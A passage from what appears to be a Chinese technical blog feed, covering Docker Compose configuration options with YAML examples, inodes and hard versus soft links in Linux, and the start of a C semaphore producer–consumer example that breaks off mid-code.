class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br></pre></td><td class="code"><pre><code class="hljs bash">Compose和Docker兼容性：<br>    Compose 文件格式有3个版本,分别为1, 2.x 和 3.x<br>    目前主流的为 3.x 其支持 docker 1.13.0 及其以上的版本<br><br>常用参数：<br>    version           <span class="hljs-comment"># 指定 compose 文件的版本</span><br>    services          <span class="hljs-comment"># 定义所有的 service 信息, services 下面的第一级别的 key 既是一个 service 的名称</span><br><br>        build                 <span class="hljs-comment"># 指定包含构建上下文的路径, 或作为一个对象，该对象具有 context 和指定的 dockerfile 文件以及 args 参数值</span><br>            context               <span class="hljs-comment"># context: 指定 Dockerfile 文件所在的路径</span><br>            dockerfile            <span class="hljs-comment"># dockerfile: 指定 context 指定的目录下面的 Dockerfile 的名称(默认为 Dockerfile)</span><br>            args                  <span class="hljs-comment"># args: Dockerfile 在 build 过程中需要的参数 (等同于 docker container build --build-arg 的作用)</span><br>            cache_from            <span class="hljs-comment"># v3.2中新增的参数, 指定缓存的镜像列表 (等同于 docker container build --cache_from 的作用)</span><br>            labels                <span class="hljs-comment"># v3.3中新增的参数, 设置镜像的元数据 (等同于 docker container build --labels 的作用)</span><br>            shm_size              <span class="hljs-comment"># v3.5中新增的参数, 设置容器 /dev/shm 分区的大小 (等同于 docker container build --shm-size 的作用)</span><br><br>        <span class="hljs-built_in">command</span>               <span class="hljs-comment"># 覆盖容器启动后默认执行的命令, 支持 shell 格式和 [] 格式</span><br><br>        configs               <span class="hljs-comment"># 不知道怎么用</span><br><br>        cgroup_parent         <span class="hljs-comment"># 不知道怎么用</span><br><br>        container_name        <span class="hljs-comment"># 指定容器的名称 (等同于 docker run --name 的作用)</span><br><br>        credential_spec       <span class="hljs-comment"># 不知道怎么用</span><br><br>        deploy                <span class="hljs-comment"># v3 版本以上, 指定与部署和运行服务相关的配置, deploy 部分是 docker stack 使用的, docker stack 依赖 docker swarm</span><br>            endpoint_mode         <span class="hljs-comment"># v3.3 版本中新增的功能, 指定服务暴露的方式</span><br>                vip                   <span class="hljs-comment"># Docker 为该服务分配了一个虚拟 IP(VIP), 作为客户端的访问服务的地址</span><br>                dnsrr                 <span class="hljs-comment"># DNS轮询, Docker 为该服务设置 DNS 条目, 使得服务名称的 DNS 查询返回一个 IP 地址列表, 客户端直接访问其中的一个地址</span><br>            labels                <span class="hljs-comment"># 指定服务的标签，这些标签仅在服务上设置</span><br>            mode                  <span class="hljs-comment"># 指定 deploy 的模式</span><br>                global                <span class="hljs-comment"># 每个集群节点都只有一个容器</span><br>                replicated            <span class="hljs-comment"># 用户可以指定集群中容器的数量(默认)</span><br>            placement             <span class="hljs-comment"># 不知道怎么用</span><br>            replicas              <span class="hljs-comment"># deploy 的 mode 为 replicated 时, 指定容器副本的数量</span><br>            resources             <span class="hljs-comment"># 资源限制</span><br>                limits                <span class="hljs-comment"># 设置容器的资源限制</span><br>                    cpus: <span class="hljs-string">&quot;0.5&quot;</span>           <span class="hljs-comment"># 设置该容器最多只能使用 50% 的 CPU </span><br>                    memory: 50M           <span class="hljs-comment"># 设置该容器最多只能使用 50M 的内存空间 </span><br>                reservations          <span class="hljs-comment"># 设置为容器预留的系统资源(随时可用)</span><br>                    cpus: <span class="hljs-string">&quot;0.2&quot;</span>           <span class="hljs-comment"># 为该容器保留 20% 的 CPU</span><br>                    memory: 20M           <span class="hljs-comment"># 为该容器保留 20M 的内存空间</span><br>            restart_policy        <span class="hljs-comment"># 定义容器重启策略, 用于代替 restart 参数</span><br>                condition             <span class="hljs-comment"># 定义容器重启策略(接受三个参数)</span><br>                    none                  <span class="hljs-comment"># 不尝试重启</span><br>                    on-failure            <span class="hljs-comment"># 只有当容器内部应用程序出现问题才会重启</span><br>                    any                   <span class="hljs-comment"># 无论如何都会尝试重启(默认)</span><br>                delay                 <span class="hljs-comment"># 尝试重启的间隔时间(默认为 0s)</span><br>                max_attempts          <span class="hljs-comment"># 尝试重启次数(默认一直尝试重启)</span><br>                window                <span class="hljs-comment"># 检查重启是否成功之前的等待时间(即如果容器启动了, 隔多少秒之后去检测容器是否正常, 默认 0s)</span><br>            update_config         <span class="hljs-comment"># 用于配置滚动更新配置</span><br>                parallelism           <span class="hljs-comment"># 一次性更新的容器数量</span><br>                delay                 <span class="hljs-comment"># 更新一组容器之间的间隔时间</span><br>                failure_action        <span class="hljs-comment"># 定义更新失败的策略</span><br>                    <span class="hljs-built_in">continue</span>              <span class="hljs-comment"># 继续更新</span><br>                    rollback              <span class="hljs-comment"># 回滚更新</span><br>                    pause                 <span class="hljs-comment"># 暂停更新(默认)</span><br>                monitor               <span class="hljs-comment"># 每次更新后的持续时间以监视更新是否失败(单位: ns|us|ms|s|m|h) (默认为0)</span><br>                max_failure_ratio     <span class="hljs-comment"># 回滚期间容忍的失败率(默认值为0)</span><br>                order                 <span class="hljs-comment"># v3.4 版本中新增的参数, 回滚期间的操作顺序</span><br>                    stop-first            <span class="hljs-comment">#旧任务在启动新任务之前停止(默认)</span><br>                    start-first           <span class="hljs-comment">#首先启动新任务, 并且正在运行的任务暂时重叠</span><br>            rollback_config       <span class="hljs-comment"># v3.7 版本中新增的参数, 用于定义在 update_config 更新失败的回滚策略</span><br>                parallelism           <span class="hljs-comment"># 一次回滚的容器数, 如果设置为0, 则所有容器同时回滚</span><br>                delay                 <span class="hljs-comment"># 每个组回滚之间的时间间隔(默认为0)</span><br>                failure_action        <span class="hljs-comment"># 定义回滚失败的策略</span><br>                    <span class="hljs-built_in">continue</span>              <span class="hljs-comment"># 继续回滚</span><br>                    pause                 <span class="hljs-comment"># 暂停回滚</span><br>                monitor               <span class="hljs-comment"># 每次回滚任务后的持续时间以监视失败(单位: ns|us|ms|s|m|h) (默认为0)</span><br>                max_failure_ratio     <span class="hljs-comment"># 回滚期间容忍的失败率(默认值0)</span><br>                order                 <span class="hljs-comment"># 回滚期间的操作顺序</span><br>                    stop-first            <span class="hljs-comment"># 旧任务在启动新任务之前停止(默认)</span><br>                    start-first           <span class="hljs-comment"># 首先启动新任务, 并且正在运行的任务暂时重叠</span><br><br>            注意：<br>                支持 docker-compose up 和 docker-compose run 但不支持 docker stack deploy 的子选项<br>                security_opt  container_name  devices  tmpfs  stop_signal  links    cgroup_parent<br>                network_mode  external_links  restart  build  userns_mode  sysctls<br><br>        devices               <span class="hljs-comment"># 指定设备映射列表 (等同于 docker run --device 的作用)</span><br><br>        depends_on            <span class="hljs-comment"># 定义容器启动顺序 (此选项解决了容器之间的依赖关系， 此选项在 v3 版本中 使用 swarm 部署时将忽略该选项)</span><br>            示例：<br>                docker-compose up 以依赖顺序启动服务，下面例子中 redis 和 db 服务在 web 启动前启动<br>                默认情况下使用 docker-compose up web 这样的方式启动 web 服务时，也会启动 redis 和 db 两个服务，因为在配置文件中定义了依赖关系<br>                version: <span class="hljs-string">&#x27;3&#x27;</span><br>                services:<br>                    web:<br>                        build: .<br>                        depends_on:<br>                            - db      <br>                            - redis  <br>                    redis:<br>                        image: redis<br>                    db:<br>                        image: postgres                             <br><br>        dns                   <span class="hljs-comment"># 设置 DNS 地址(等同于 docker run --dns 的作用)</span><br><br>        dns_search            <span class="hljs-comment"># 设置 DNS 搜索域(等同于 docker run --dns-search 的作用)</span><br><br>        tmpfs                 <span class="hljs-comment"># v2 版本以上, 挂载目录到容器中, 作为容器的临时文件系统(等同于 docker run --tmpfs 的作用, 在使用 swarm 部署时将忽略该选项)</span><br><br>        entrypoint            <span class="hljs-comment"># 覆盖容器的默认 entrypoint 指令 (等同于 docker run --entrypoint 的作用)</span><br><br>        env_file              <span class="hljs-comment"># 从指定文件中读取变量设置为容器中的环境变量, 可以是单个值或者一个文件列表, 如果多个文件中的变量重名则后面的变量覆盖前面的变量, environment 的值覆盖 env_file 的值</span><br>            文件格式：<br>                RACK_ENV=development <br><br>        environment           <span class="hljs-comment"># 设置环境变量， environment 的值可以覆盖 env_file 的值 (等同于 docker run --env 的作用)</span><br><br>        expose                <span class="hljs-comment"># 暴露端口, 但是不能和宿主机建立映射关系, 类似于 Dockerfile 的 EXPOSE 指令</span><br><br>        external_links        <span class="hljs-comment"># 连接不在 docker-compose.yml 中定义的容器或者不在 compose 管理的容器(docker run 启动的容器, 在 v3 版本中使用 swarm 部署时将忽略该选项)</span><br><br>        extra_hosts           <span class="hljs-comment"># 添加 host 记录到容器中的 /etc/hosts 中 (等同于 docker run --add-host 的作用)</span><br><br>        healthcheck           <span class="hljs-comment"># v2.1 以上版本, 定义容器健康状态检查, 类似于 Dockerfile 的 HEALTHCHECK 指令</span><br>            <span class="hljs-built_in">test</span>                  <span class="hljs-comment"># 检查容器检查状态的命令, 该选项必须是一个字符串或者列表, 第一项必须是 NONE, CMD 或 CMD-SHELL, 如果其是一个字符串则相当于 CMD-SHELL 加该字符串</span><br>                NONE                  <span class="hljs-comment"># 禁用容器的健康状态检测</span><br>                CMD                   <span class="hljs-comment"># test: [&quot;CMD&quot;, &quot;curl&quot;, &quot;-f&quot;, &quot;http://localhost&quot;]</span><br>                CMD-SHELL             <span class="hljs-comment"># test: [&quot;CMD-SHELL&quot;, &quot;curl -f http://localhost || exit 1&quot;] 或者　test: curl -f https://localhost || exit 1</span><br>            interval: 1m30s       <span class="hljs-comment"># 每次检查之间的间隔时间</span><br>            <span class="hljs-built_in">timeout</span>: 10s          <span class="hljs-comment"># 运行命令的超时时间</span><br>            retries: 3            <span class="hljs-comment"># 重试次数</span><br>            start_period: 40s     <span class="hljs-comment"># v3.4 以上新增的选项, 定义容器启动时间间隔</span><br>            <span class="hljs-built_in">disable</span>: <span class="hljs-literal">true</span>         <span class="hljs-comment"># true 或 false, 表示是否禁用健康状态检测和　test: NONE 相同</span><br><br>        image                 <span class="hljs-comment"># 指定 docker 镜像, 可以是远程仓库镜像、本地镜像</span><br><br>        init                  <span class="hljs-comment"># v3.7 中新增的参数, true 或 false 表示是否在容器中运行一个 init, 它接收信号并传递给进程</span><br><br>        isolation             <span class="hljs-comment"># 隔离容器技术, 在 Linux 中仅支持 default 值</span><br><br>        labels                <span class="hljs-comment"># 使用 Docker 标签将元数据添加到容器, 与 Dockerfile 中的 LABELS 类似</span><br><br>        links                 <span class="hljs-comment"># 链接到其它服务中的容器, 该选项是 docker 历史遗留的选项, 目前已被用户自定义网络名称空间取代, 最终有可能被废弃 (在使用 swarm 部署时将忽略该选项)</span><br><br>        logging               <span class="hljs-comment"># 设置容器日志服务</span><br>            driver                <span class="hljs-comment"># 指定日志记录驱动程序, 默认 json-file (等同于 docker run --log-driver 的作用)</span><br>            options               <span class="hljs-comment"># 指定日志的相关参数 (等同于 docker run --log-opt 的作用)</span><br>                max-size              <span class="hljs-comment"># 设置单个日志文件的大小, 当到达这个值后会进行日志滚动操作</span><br>                max-file              <span class="hljs-comment"># 日志文件保留的数量</span><br><br>        network_mode          <span class="hljs-comment"># 指定网络模式 (等同于 docker run --net 的作用, 在使用 swarm 部署时将忽略该选项)         </span><br><br>        networks              <span class="hljs-comment"># 将容器加入指定网络 (等同于 docker network connect 的作用), networks 可以位于 compose 文件顶级键和 services 键的二级键</span><br>            aliases               <span class="hljs-comment"># 同一网络上的容器可以使用服务名称或别名连接到其中一个服务的容器</span><br>            ipv4_address      <span class="hljs-comment"># IP V4 格式</span><br>            ipv6_address      <span class="hljs-comment"># IP V6 格式</span><br><br>            示例:<br>                version: <span class="hljs-string">&#x27;3.7&#x27;</span><br>                services: <br>                    <span class="hljs-built_in">test</span>: <br>                        image: nginx:1.14-alpine<br>                        container_name: mynginx<br>                        <span class="hljs-built_in">command</span>: ifconfig<br>                        networks: <br>                            app_net:                                <span class="hljs-comment"># 调用下面 networks 定义的 app_net 网络</span><br>                            ipv4_address: 172.16.238.10<br>                networks:<br>                    app_net:<br>                        driver: bridge<br>                        ipam:<br>                            driver: default<br>                            config:<br>                                - subnet: 172.16.238.0/24<br><br>        pid: <span class="hljs-string">&#x27;host&#x27;</span>           <span class="hljs-comment"># 共享宿主机的 进程空间(PID)</span><br><br>        ports                 <span class="hljs-comment"># 建立宿主机和容器之间的端口映射关系, ports 支持两种语法格式</span><br>            SHORT 语法格式示例:<br>                - <span class="hljs-string">&quot;3000&quot;</span>                            <span class="hljs-comment"># 暴露容器的 3000 端口, 宿主机的端口由 docker 随机映射一个没有被占用的端口</span><br>                - <span class="hljs-string">&quot;3000-3005&quot;</span>                       <span class="hljs-comment"># 暴露容器的 3000 到 3005 端口, 宿主机的端口由 docker 随机映射没有被占用的端口</span><br>                - <span class="hljs-string">&quot;8000:8000&quot;</span>                       <span class="hljs-comment"># 容器的 8000 端口和宿主机的 8000 端口建立映射关系</span><br>                - <span class="hljs-string">&quot;9090-9091:8080-8081&quot;</span><br>                - <span class="hljs-string">&quot;127.0.0.1:8001:8001&quot;</span>             <span class="hljs-comment"># 指定映射宿主机的指定地址的</span><br>                - <span class="hljs-string">&quot;127.0.0.1:5000-5010:5000-5010&quot;</span>   <br>                - <span class="hljs-string">&quot;6060:6060/udp&quot;</span>                   <span class="hljs-comment"># 指定协议</span><br><br>            LONG 语法格式示例:(v3.2 新增的语法格式)<br>                ports:<br>                    - target: 80                    <span class="hljs-comment"># 容器端口</span><br>                      published: 8080               <span class="hljs-comment"># 宿主机端口</span><br>                      protocol: tcp                 <span class="hljs-comment"># 协议类型</span><br>                      mode: host                    <span class="hljs-comment"># host 在每个节点上发布主机端口,  ingress 对于群模式端口进行负载均衡</span><br><br>        secrets               <span class="hljs-comment"># 不知道怎么用</span><br><br>        security_opt          <span class="hljs-comment"># 为每个容器覆盖默认的标签 (在使用 swarm 部署时将忽略该选项)</span><br><br>        stop_grace_period     <span class="hljs-comment"># 指定在发送了 SIGTERM 信号之后, 容器等待多少秒之后退出(默认 10s)</span><br><br>        stop_signal           <span class="hljs-comment"># 指定停止容器发送的信号 (默认为 SIGTERM 相当于 kill PID; SIGKILL 相当于 kill -9 PID; 在使用 swarm 部署时将忽略该选项)</span><br><br>        sysctls               <span class="hljs-comment"># 设置容器中的内核参数 (在使用 swarm 部署时将忽略该选项)</span><br><br>        ulimits               <span class="hljs-comment"># 设置容器的 limit</span><br><br>        userns_mode           <span class="hljs-comment"># 如果Docker守护程序配置了用户名称空间, 则禁用此服务的用户名称空间 (在使用 swarm 部署时将忽略该选项)</span><br><br>        volumes               <span class="hljs-comment"># 定义容器和宿主机的卷映射关系, 其和 networks 一样可以位于 services 键的二级键和 compose 顶级键, 如果需要跨服务间使用则在顶级键定义, 在 services 中引用</span><br>            SHORT 语法格式示例:<br>                volumes:<br>                    - /var/lib/mysql                <span class="hljs-comment"># 映射容器内的 /var/lib/mysql 到宿主机的一个随机目录中</span><br>                    - /opt/data:/var/lib/mysql      <span class="hljs-comment"># 映射容器内的 /var/lib/mysql 到宿主机的 /opt/data</span><br>                    - ./cache:/tmp/cache            <span class="hljs-comment"># 映射容器内的 /var/lib/mysql 到宿主机 compose 文件所在的位置</span><br>                    - ~/configs:/etc/configs/:ro    <span class="hljs-comment"># 映射容器宿主机的目录到容器中去, 权限只读</span><br>                    - datavolume:/var/lib/mysql     <span class="hljs-comment"># datavolume 为 volumes 顶级键定义的目录, 在此处直接调用</span><br><br>            LONG 语法格式示例:(v3.2 新增的语法格式)<br>                version: <span class="hljs-string">&quot;3.2&quot;</span><br>                services:<br>                    web:<br>                        image: nginx:alpine<br>                        ports:<br>                            - <span class="hljs-string">&quot;80:80&quot;</span><br>                        volumes:<br>                            - <span class="hljs-built_in">type</span>: volume                  <span class="hljs-comment"># mount 的类型, 必须是 bind、volume 或 tmpfs</span><br>                                <span class="hljs-built_in">source</span>: mydata              <span class="hljs-comment"># 宿主机目录</span><br>                                target: /data               <span class="hljs-comment"># 容器目录</span><br>                                volume:                     <span class="hljs-comment"># 配置额外的选项, 其 key 必须和 type 的值相同</span><br>                                    nocopy: <span class="hljs-literal">true</span>                <span class="hljs-comment"># volume 额外的选项, 在创建卷时禁用从容器复制数据</span><br>                            - <span class="hljs-built_in">type</span>: <span class="hljs-built_in">bind</span>                    <span class="hljs-comment"># volume 模式只指定容器路径即可, 宿主机路径随机生成; bind 需要指定容器和数据机的映射路径</span><br>                                <span class="hljs-built_in">source</span>: ./static<br>                                target: /opt/app/static<br>                                read_only: <span class="hljs-literal">true</span>             <span class="hljs-comment"># 设置文件系统为只读文件系统</span><br>                volumes:<br>                    mydata:                                 <span class="hljs-comment"># 定义在 volume, 可在所有服务中调用</span><br><br>        restart               <span class="hljs-comment"># 定义容器重启策略(在使用 swarm 部署时将忽略该选项, 在 swarm 使用 restart_policy 代替 restart)</span><br>            no                    <span class="hljs-comment"># 禁止自动重启容器(默认)</span><br>            always                <span class="hljs-comment"># 无论如何容器都会重启</span><br>            on-failure            <span class="hljs-comment"># 当出现 on-failure 报错时, 容器重新启动</span><br><br>        其他选项：<br>            domainname, hostname, ipc, mac_address, privileged, read_only, shm_size, stdin_open, <span class="hljs-built_in">tty</span>, user, working_dir<br>            上面这些选项都只接受单个值和 docker run 的对应参数类似<br><br>        对于值为时间的可接受的值：<br>            2.5s<br>            10s<br>            1m30s<br>            2h32m<br>            5h34m56s<br>            时间单位: us, ms, s, m， h<br>        对于值为大小的可接受的值：<br>            2b<br>            1024kb<br>            2048k<br>            300m<br>            1gb<br>            单位: b, k, m, g 或者 kb, mb, gb<br>    networks          <span class="hljs-comment"># 定义 networks 信息</span><br>        driver                <span class="hljs-comment"># 指定网络模式, 大多数情况下, 它 bridge 于单个主机和 overlay Swarm 上</span><br>            bridge                <span class="hljs-comment"># Docker 默认使用 bridge 连接单个主机上的网络</span><br>            overlay               <span class="hljs-comment"># overlay 驱动程序创建一个跨多个节点命名的网络</span><br>            host                  <span class="hljs-comment"># 共享主机网络名称空间(等同于 docker run --net=host)</span><br>            none                  <span class="hljs-comment"># 等同于 docker run --net=none</span><br>        driver_opts           <span class="hljs-comment"># v3.2以上版本, 传递给驱动程序的参数, 这些参数取决于驱动程序</span><br>        attachable            <span class="hljs-comment"># driver 为 overlay 时使用, 如果设置为 true 则除了服务之外，独立容器也可以附加到该网络; 如果独立容器连接到该网络，则它可以与其他 Docker 守护进程连接到的该网络的服务和独立容器进行通信</span><br>        ipam                  <span class="hljs-comment"># 自定义 IPAM 配置. 这是一个具有多个属性的对象, 每个属性都是可选的</span><br>            driver                <span class="hljs-comment"># IPAM 驱动程序, bridge 或者 default</span><br>            config                <span class="hljs-comment"># 配置项</span><br>                subnet                <span class="hljs-comment"># CIDR格式的子网，表示该网络的网段</span><br>        external              <span class="hljs-comment"># 外部网络, 如果设置为 true 则 docker-compose up 不会尝试创建它, 如果它不存在则引发错误</span><br>        name                  <span class="hljs-comment"># v3.5 以上版本, 为此网络设置名称</span><br>文件格式示例：<br>    version: <span class="hljs-string">&quot;3&quot;</span><br>    services:<br>      redis:<br>        image: redis:alpine<br>        ports:<br>          - <span class="hljs-string">&quot;6379&quot;</span><br>        networks:<br>          - frontend<br>        deploy:<br>          replicas: 2<br>          update_config:<br>            parallelism: 2<br>            delay: 10s<br>          restart_policy:<br>            condition: on-failure<br>      db:<br>        image: postgres:9.4<br>        volumes:<br>          - db-data:/var/lib/postgresql/data<br>        networks:<br>          - backend<br>        deploy:<br>          placement:<br>            constraints: [node.role == manager]<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件配置与使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>硬链接和软链接</title>
    <link href="/2022/04/17/%E7%A1%AC%E9%93%BE%E6%8E%A5%E5%92%8C%E8%BD%AF%E9%93%BE%E6%8E%A5/"/>
    <url>/2022/04/17/%E7%A1%AC%E9%93%BE%E6%8E%A5%E5%92%8C%E8%BD%AF%E9%93%BE%E6%8E%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="硬链接和软链接"><a href="#硬链接和软链接" class="headerlink" title="硬链接和软链接"></a>硬链接和软链接</h1><h3 id="1-inode的概念"><a href="#1-inode的概念" class="headerlink" title="1.inode的概念"></a>1.inode的概念</h3><p>文件存储在磁盘上,磁盘在格式化文件系统后,分为两个部分,一个是inode存储区,一个是数据存储区,每个inode存储了这个文件详细信息,这些信息一般有:</p><ul><li><p>1.文件的所属者</p></li><li><p>2.文件的所属组</p></li><li><p>3.文件的权限</p></li><li><p>4.文件的创建时间</p></li><li><p>5.文件最近修改的时间</p></li><li><p>6.文件的最近访问时间</p></li><li><p>7.链接数,(有多少个链接指向这个文件)</p></li><li><p>8.文件的大小</p><p>用户可以使用stat命令查看这些信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">stat</span> filename<br></code></pre></td></tr></table></figure><p>在linux平台上,</p><p>linux并不使用文件名识别文件,而使用inode识别文件,因此linux下每个文件名都指向了一个inode,在用户访问文件时,linux内部首先会获取要访问文件的inode号码,从inode里面获取真正的数据存储区。获取文件数据,在删除文件的时候,文件的links减1,当links减到0时,inode会被删除  </p><p>用户可以使用stat命令查看这些信息</p></li></ul><h3 id="2-硬链接"><a href="#2-硬链接" class="headerlink" title="2.硬链接"></a>2.硬链接</h3><p>  硬链接和源文件拥有相同的inode,<br>  linux使用ln 源文件名 目标文件名创建硬链接,</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> /path/to/sourcefile /path/to/destnaionfile<br></code></pre></td></tr></table></figure><h3 id="3-软链接"><a href="#3-软链接" class="headerlink" title="3.软链接"></a>3.软链接</h3><p>  ​软连接是一个存在的文件,但是文件里面存储的内容时目标文件的路径</p>]]></content>
    
    
    <categories>
      
      <category>计算机基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>线程同步</title>
    <link href="/2022/04/17/%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5/"/>
    <url>/2022/04/17/%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h1><h3 id="1-使用信号量实现线程同步"><a href="#1-使用信号量实现线程同步" class="headerlink" title="1.使用信号量实现线程同步"></a>1.使用信号量实现线程同步</h3><h3 id="使用的api"><a href="#使用的api" class="headerlink" title="使用的api"></a>使用的api</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sem_init</span><span class="hljs-params">(<span class="hljs-type">sem_t</span> *sem,<span class="hljs-type">int</span> shared,<span class="hljs-type">int</span> value)</span>;<span class="hljs-comment">//初始化无名信号灯</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sem_wait</span><span class="hljs-params">(<span class="hljs-type">sem_t</span> *sem)</span>;<span class="hljs-comment">//p操作,如果信号量大于0,则信号量-1,函数立即返回,否则函数进入阻塞状态直到信号量大于0</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sem_post</span><span class="hljs-params">(<span class="hljs-type">sem_t</span> *sem)</span>;<span class="hljs-comment">//v操作,如果信号量等于0,则信号量+1,函数立即返回,否则函数进入阻塞状态,直到信号量等于0</span><br></code></pre></td></tr></table></figure><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;strings.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fifo <span class="hljs-string">&quot;/tmp/myfifo&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> string <span class="hljs-string">&quot;myhelloworld&quot;</span></span><br><br><span class="hljs-type">int</span> fd = <span class="hljs-number">0</span>;<br><span class="hljs-type">sem_t</span> full, avail, mutex;<span class="hljs-comment">//初始化三个全局信号量</span><br><span class="hljs-comment">//生产者线程函数</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">producer</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br>    sem_wait(&amp;avail);<br>    sem_wait(&amp;mutex);<br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> stringlen = <span class="hljs-built_in">strlen</span>(<span class="hljs-built_in">string</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">//action</span><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (i &lt; <span class="hljs-number">5</span>) &#123;<br>        ret = write(fd, <span class="hljs-built_in">string</span>, stringlen);<br>        <span class="hljs-keyword">if</span> (ret != stringlen) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;write string to fifo file error!\n&quot;</span>);<br>            pthread_exit(<span class="hljs-literal">NULL</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nwrite string to fifo file successful!\n&quot;</span>);<br>        sem_post(&amp;full);<br>        sem_post(&amp;mutex);<br>        sleep(<span class="hljs-number">1</span>);<br>        i++;<br>    &#125;<br>    pthread_exit(<span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span 